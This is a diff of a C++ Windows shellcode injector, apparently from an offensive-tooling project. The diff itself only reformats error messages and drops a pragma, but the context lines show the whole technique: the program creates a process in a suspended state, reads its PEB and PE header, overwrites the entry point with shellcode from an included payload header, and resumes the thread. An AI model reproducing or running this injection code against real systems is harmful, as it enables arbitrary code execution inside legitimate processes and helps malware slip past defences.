@@ -8,8 +8,6 @@
 #include <cstdint>
 #include <cstdio>
 
-#pragma comment(lib, "ntdll")
-
 #include "../payload/shellcode.hpp"
 
 
@@ -31,7 +29,7 @@ int main(int argc, char* argv[])
 	// create the process in a suspended state
 	if (!CreateProcessA(0, binaryPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInformation))
 	{
-		printf("Error %d - Failed to create process %s\n", GetLastError(), binaryPath);
+		printf("[Error] %d - Failed to create process %s\n", GetLastError(), binaryPath);
 		return 1;
 	}
 
@@ -41,7 +39,7 @@ int main(int argc, char* argv[])
 	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
 	if (error)
 	{
-		printf("Error %d - Failed to query process basic information\n", GetLastError());
+		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
 		return 1;
 	}
 
@@ -50,7 +48,7 @@ int main(int argc, char* argv[])
 	LPVOID processBasesAddress = 0;
 	if (!ReadProcessMemory(processInformation.hProcess, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
 	{
-		printf("Error %d - Failed to read PEB offset\n", GetLastError());
+		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
 		return 1;
 	}
 
@@ -59,7 +57,7 @@ int main(int argc, char* argv[])
 	int8_t peBuffer[PE_BUFFER_SIZE] = {};
 	if (!ReadProcessMemory(processInformation.hProcess, processBasesAddress, peBuffer, PE_BUFFER_SIZE, NULL))
 	{
-		printf("Error %d - Failed to read PE header\n", GetLastError());
+		printf("[Error] %d - Failed to read PE header\n", GetLastError());
 		return 1;
 	}
 
@@ -72,7 +70,7 @@ int main(int argc, char* argv[])
 	// write the shellcode to the entry point
 	if (!WriteProcessMemory(processInformation.hProcess, entryPoint, shellcode, sizeof(shellcode)-1, NULL))
 	{
-		printf("Error %d - Failed to write shellcode to entry point\n", GetLastError());
+		printf("[Error] %d - Failed to write shellcode to entry point\n", GetLastError());
 		return 1;
 	}
 
@@ -81,7 +79,7 @@ int main(int argc, char* argv[])
 	// resume the thread of the suspended process
 	if (ResumeThread(processInformation.hThread) == -1)
 	{
-		printf("Error %d - Failed to resume thread\n", GetLastError());
+		printf("[Error] %d - Failed to resume thread\n", GetLastError());
 		return 1;
 	}
 
